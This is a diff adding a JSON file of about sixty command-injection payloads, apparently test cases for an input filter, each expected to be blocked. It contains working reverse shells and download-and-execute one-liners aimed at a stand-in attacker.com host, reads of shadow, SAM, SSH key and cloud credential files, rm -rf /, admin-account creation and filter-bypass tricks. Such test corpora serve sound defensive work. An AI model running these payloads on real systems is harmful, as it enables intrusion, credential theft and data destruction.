@@ -1,0 +1,662 @@
+[
+  {
+      "id": "INJ-COMMAND-250",
+      "payload": "; ls -la",
+      "tags": [
+        "unix",
+        "semicolon",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix command injection - semicolon separator",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-251",
+      "payload": "| cat /etc/passwd",
+      "tags": [
+        "unix",
+        "pipe",
+        "quick",
+        "sensitive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix pipe command injection - read passwd file",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-252",
+      "payload": "& dir",
+      "tags": [
+        "windows",
+        "ampersand",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows command injection - ampersand separator",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-253",
+      "payload": "|| whoami",
+      "tags": [
+        "unix",
+        "or-operator"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix OR operator - command chaining",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-254",
+      "payload": "&& id",
+      "tags": [
+        "unix",
+        "and-operator"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix AND operator - conditional execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-255",
+      "payload": "`whoami`",
+      "tags": [
+        "unix",
+        "backtick",
+        "substitution"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix backtick command substitution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-256",
+      "payload": "$(cat /etc/shadow)",
+      "tags": [
+        "unix",
+        "substitution",
+        "sensitive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix $() command substitution - read shadow file",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-257",
+      "payload": "> /tmp/owned",
+      "tags": [
+        "unix",
+        "redirect",
+        "file-write"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix output redirection - file creation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-258",
+      "payload": "< /etc/hosts",
+      "tags": [
+        "unix",
+        "redirect",
+        "file-read"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix input redirection - file read",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-259",
+      "payload": "; curl http://attacker.com/shell.sh | sh",
+      "tags": [
+        "unix",
+        "rce",
+        "download-execute"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix download and execute remote shell",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-260",
+      "payload": "; nc -e /bin/sh attacker.com 4444",
+      "tags": [
+        "unix",
+        "rce",
+        "reverse-shell"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix netcat reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-261",
+      "payload": "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "tags": [
+        "unix",
+        "rce",
+        "python-shell"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix Python reverse shell one-liner",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-262",
+      "payload": "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "tags": [
+        "unix",
+        "rce",
+        "bash-reverse-shell"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix Bash TCP reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-263",
+      "payload": "; rm -rf /",
+      "tags": [
+        "unix",
+        "destructive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix recursive deletion (DESTRUCTIVE)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-264",
+      "payload": "; wget http://attacker.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware",
+      "tags": [
+        "unix",
+        "rce",
+        "malware"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix download, make executable, and run malware",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-265",
+      "payload": "& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
+      "tags": [
+        "windows",
+        "powershell",
+        "rce"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows PowerShell download and execute",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-266",
+      "payload": "& net user hacker P@ssw0rd /add",
+      "tags": [
+        "windows",
+        "persistence"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows add new user (persistence)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-267",
+      "payload": "& net localgroup administrators hacker /add",
+      "tags": [
+        "windows",
+        "privilege-escalation"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows add user to administrators group",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-268",
+      "payload": "& type C:\\Windows\\System32\\config\\SAM",
+      "tags": [
+        "windows",
+        "sensitive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows read SAM file (password hashes)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-269",
+      "payload": "& reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "tags": [
+        "windows",
+        "registry",
+        "persistence"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Windows registry enumeration - startup programs",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-270",
+      "payload": "; cat /proc/self/environ",
+      "tags": [
+        "unix",
+        "env-vars"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix read process environment variables",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-271",
+      "payload": "; printenv",
+      "tags": [
+        "unix",
+        "env-vars"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix print all environment variables",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-272",
+      "payload": "; cat ~/.ssh/id_rsa",
+      "tags": [
+        "unix",
+        "ssh-keys",
+        "sensitive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix read SSH private key",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-273",
+      "payload": "; find / -name \"*.conf\" -type f",
+      "tags": [
+        "unix",
+        "enumeration"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix find all config files",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-274",
+      "payload": "; ps aux",
+      "tags": [
+        "unix",
+        "enumeration"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Unix list all running processes",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-275",
+      "payload": "; netstat -tulpn",
+      "tags": [
+        "unix",
+        "enumeration",
+        "network"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix enumerate listening network ports",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-276",
+      "payload": "; uname -a",
+      "tags": [
+        "unix",
+        "enumeration",
+        "recon"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Unix system information disclosure",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-277",
+      "payload": "& systeminfo",
+      "tags": [
+        "windows",
+        "enumeration",
+        "recon"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Windows system information disclosure",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-278",
+      "payload": "; cat /etc/crontab",
+      "tags": [
+        "unix",
+        "enumeration"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Unix read scheduled tasks",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-279",
+      "payload": "; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "tags": [
+        "unix",
+        "cloud",
+        "aws",
+        "ssrf"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Unix AWS metadata service - steal IAM credentials",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-280",
+      "payload": ";${IFS}cat${IFS}/etc/passwd",
+      "tags": ["unix", "ifs-bypass", "whitespace"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IFS variable whitespace bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-281",
+      "payload": ";{cat,/etc/passwd}",
+      "tags": ["unix", "brace-expansion"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bash brace expansion bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-282",
+      "payload": "$(<\"/etc/passwd\")",
+      "tags": ["unix", "file-substitution"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "File content substitution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-283",
+      "payload": ";ca$()t /etc/passwd",
+      "tags": ["unix", "inline-substitution", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Empty substitution command bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-284",
+      "payload": ";ca''t /etc/passwd",
+      "tags": ["unix", "quote-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Single quote splitting bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-285",
+      "payload": ";ca\"\"t /etc/passwd",
+      "tags": ["unix", "double-quote-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Double quote splitting bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-286",
+      "payload": ";c\\at /etc/passwd",
+      "tags": ["unix", "backslash-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Backslash escape bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-287",
+      "payload": ";/???/c?t /etc/passwd",
+      "tags": ["unix", "glob-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Glob pattern command bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-288",
+      "payload": ";/???/???/c?t /etc/passwd",
+      "tags": ["unix", "glob-path"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Glob pattern path bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-289",
+      "payload": "echo$IFS'test'$IFS>/tmp/pwned",
+      "tags": ["unix", "ifs", "file-write"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IFS-based file write",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-290",
+      "payload": ";base64 /etc/passwd",
+      "tags": ["unix", "encoding", "exfiltration"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Base64 encoded exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-291",
+      "payload": ";xxd /etc/passwd",
+      "tags": ["unix", "hex", "exfiltration"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Hex dump exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-292",
+      "payload": ";od -A x -t x1z /etc/passwd",
+      "tags": ["unix", "octal-dump"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Octal dump exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-293",
+      "payload": "$(python -c 'print(open(\"/etc/passwd\").read())')",
+      "tags": ["unix", "python", "inline"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python inline code execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-294",
+      "payload": "$(perl -e 'print `cat /etc/passwd`')",
+      "tags": ["unix", "perl", "inline"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Perl inline code execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-295",
+      "payload": "$(ruby -e 'puts File.read(\"/etc/passwd\")')",
+      "tags": ["unix", "ruby", "inline"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Ruby inline code execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-296",
+      "payload": ";curl attacker.com/shell.sh|sh",
+      "tags": ["unix", "curl", "remote-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Remote shell download and execute",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-297",
+      "payload": ";wget -O- attacker.com/shell.sh|bash",
+      "tags": ["unix", "wget", "remote-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Wget remote shell execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-298",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'",
+      "tags": ["unix", "reverse-shell", "tcp"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bash TCP reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-299",
+      "payload": ";nc -e /bin/sh attacker 4444",
+      "tags": ["unix", "netcat", "reverse-shell"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Netcat reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-300",
+      "payload": ";mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444>/tmp/f",
+      "tags": ["unix", "fifo", "reverse-shell"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "FIFO-based reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-301",
+      "payload": "& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')\"",
+      "tags": ["windows", "powershell", "remote-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PowerShell download cradle",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-302",
+      "payload": "& powershell -enc JABjAGwAaQBlAG4AdAA=",
+      "tags": ["windows", "powershell", "encoded"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PowerShell encoded command",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-303",
+      "payload": "& certutil -urlcache -split -f http://attacker/shell.exe shell.exe",
+      "tags": ["windows", "certutil", "download"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Certutil file download",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-304",
+      "payload": "& bitsadmin /transfer job http://attacker/shell.exe c:\\shell.exe",
+      "tags": ["windows", "bitsadmin", "download"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BITSAdmin file download",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-305",
+      "payload": "& mshta http://attacker/shell.hta",
+      "tags": ["windows", "mshta", "remote-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MSHTA remote HTA execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-306",
+      "payload": "& regsvr32 /s /n /u /i:http://attacker/shell.sct scrobj.dll",
+      "tags": ["windows", "regsvr32", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Regsvr32 AppLocker bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-307",
+      "payload": "& rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject",
+      "tags": ["windows", "rundll32", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Rundll32 JavaScript execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-308",
+      "payload": ";env | grep -i password",
+      "tags": ["unix", "env", "credential"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Environment variable password search",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-309",
+      "payload": ";find / -name '*.conf' 2>/dev/null | head -20",
+      "tags": ["unix", "find", "enumeration"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Configuration file enumeration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-COMMAND-310",
+      "payload": ";grep -r 'password' /etc/ 2>/dev/null",
+      "tags": ["unix", "grep", "credential"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Grep for passwords in /etc",
+      "category": "Injection"
+  }
+]
